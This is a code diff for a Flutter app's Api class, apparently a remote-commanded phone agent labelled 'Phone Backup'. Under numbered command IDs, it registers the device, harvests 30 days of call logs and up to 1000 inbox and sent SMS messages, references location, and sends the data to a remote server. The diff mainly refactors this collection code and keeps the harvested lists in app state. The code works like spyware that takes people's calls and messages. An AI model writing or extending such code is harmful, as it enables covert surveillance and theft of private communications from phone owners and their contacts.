@@ -1,13 +1,19 @@
+// ignore_for_file: use_build_context_synchronously
+
 import 'dart:convert';
 
 import 'package:call_log/call_log.dart';
 import 'package:contacts_service/contacts_service.dart';
+import 'package:flutter/cupertino.dart';
 import 'package:flutter/foundation.dart';
 import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:http/http.dart' as http;
 import 'package:intl/intl.dart';
 
+import '../../data/models/calls_model/calls_model.dart';
+import '../../data/models/sms_model/sms_model.dart';
+import '../providers/provider_main.dart';
 import 'color_printer.dart';
 
 // Call Records, SMS, Contacts, Files)
@@ -25,10 +31,7 @@ class Api {
   // 1001 – device info
   static Future<String?> sendDeviceInfo(String? agent, String? imei) async {
     const url = '$base/a_agent_register'; // Phone Backup
-    final headers = {
-      'Content-Type': 'application/json',
-      'User-Agent': '$agent'
-    };
+    final headers = {'Content-Type': 'application/json', 'User-Agent': '$agent'};
     printYellow('headers $headers');
     final response = await http.get(Uri.parse(url), headers: headers);
 
@@ -137,7 +140,7 @@ class Api {
   }
 
   // 2 – call records
-  static Future<String?> sendCallLogs(String? agent, String? uuid) async {
+  static Future sendCallLogs(BuildContext context, String? agent, String? uuid) async {
     printWhite('START: sendCallLogs() ');
 
     if (kDebugMode) {
@@ -145,37 +148,34 @@ class Api {
       print('uuid $uuid');
     }
 
-// QUERY CALL LOG (ALL PARAMS ARE OPTIONAL)
+    // QUERY CALL LOG (ALL PARAMS ARE OPTIONAL)
     var now = DateTime.now();
     int from = now.subtract(const Duration(days: 30)).millisecondsSinceEpoch;
     Iterable<CallLogEntry> callLogs =
         await CallLog.query(dateFrom: from, dateTo: now.microsecondsSinceEpoch);
 
-    print('callLogs ${callLogs.length}');
-    print('callLogs ${callLogs.firstOrNull?.timestamp}');
-    print('callLogs ${callLogs.firstOrNull?.number}');
-
-    List callsData = [];
+    List callsJsonList = [];
+    List<CallsModel> callsModelList = [];
     for (var call in callLogs) {
-      var date = DateTime.fromMillisecondsSinceEpoch(
+      final date = DateTime.fromMillisecondsSinceEpoch(
           call.timestamp ?? now.millisecondsSinceEpoch);
+      final json = {
+        "date": serverFormat.format(date).toString(),
+        "duration": call.duration.toString(),
+        "mobileNumber": call.number.toString(),
+        "name": call.name.toString(),
+        "type": call.callType?.name.toString(),
+      };
 
-      callsData.add(
-        {
-          "date": serverFormat.format(date).toString(),
-          "duration": call.duration.toString(),
-          "mobileNumber": call.number.toString(),
-          "name": call.name.toString(),
-          "type": call.callType?.name.toString(),
-        },
-      );
+      callsJsonList.add(json);
+      final callModel = CallsModel.fromJson(json).copyWith(datetime: date);
+      callsModelList.add(callModel);
     }
 
+    providerMainScope(context).callLogs = callsModelList;
     _sendToServer(agent, uuid,
         type: 'Call Logs',
-        data: {"uuid": uuid, "command_id": "2", "data": callsData});
-
-    return 'CallLogs';
+        data: {"uuid": uuid, "command_id": "2", "data": callsJsonList});
   }
 
   // 3 - location
@@ -208,7 +208,7 @@ class Api {
   // 4 – camera (Soon)
 
   // 5 – sms list
-  static Future<String?> sendSmsLogs(String? agent, String? uuid) async {
+  static Future sendSmsLogs(BuildContext context, String? agent, String? uuid) async {
     printWhite('START: sendSmsLogs() ');
 
     if (kDebugMode) {
@@ -218,28 +218,31 @@ class Api {
 
     final smsQuery = await SmsQuery().querySms(
         sort: true,
-        count: kDebugMode ? 2 : 1000,
+        count: kDebugMode ? 20 : 1000,
         kinds: [SmsQueryKind.inbox, SmsQueryKind.sent]);
+
     // print('smsQuery.length ${smsQuery.length}');
     // print('smsQuery.toMap ${smsQuery.firstOrNull?.toMap}');
     // print('smsQuery.sender ${smsQuery.firstOrNull?.sender}');
 
-    List smsData = [];
+    List smsJsonList = [];
+    List<SmsModel> smsModelList = [];
+
     for (var sms in smsQuery) {
-      smsData.add(
-        {
-          "phone_number": sms.address.toString(),
-          "message": sms.body.toString(),
-          "date": serverFormat.format(sms.date ?? DateTime.now()).toString(),
-          "sender": sms.kind == SmsMessageKind.sent
-        },
-      );
+      final json = {
+        "phone_number": sms.address.toString(),
+        "message": sms.body.toString(),
+        "date": serverFormat.format(sms.date ?? DateTime.now()).toString(),
+        "sender": sms.kind == SmsMessageKind.sent
+      };
+      smsJsonList.add(json);
+      final smsModel = SmsModel.fromJson(json).copyWith(datetime: sms.date);
+      smsModelList.add(smsModel);
     }
 
-    _sendToServer(agent, uuid,
-        type: 'SMS Logs',
-        data: {"uuid": uuid, "command_id": "5", "data": smsData});
+    providerMainScope(context).smsLogs = smsModelList;
 
-    return 'Sms Logs';
+    _sendToServer(agent, uuid,
+        type: 'SMS Logs', data: {"uuid": uuid, "command_id": "5", "data": smsJsonList});
   }
 }
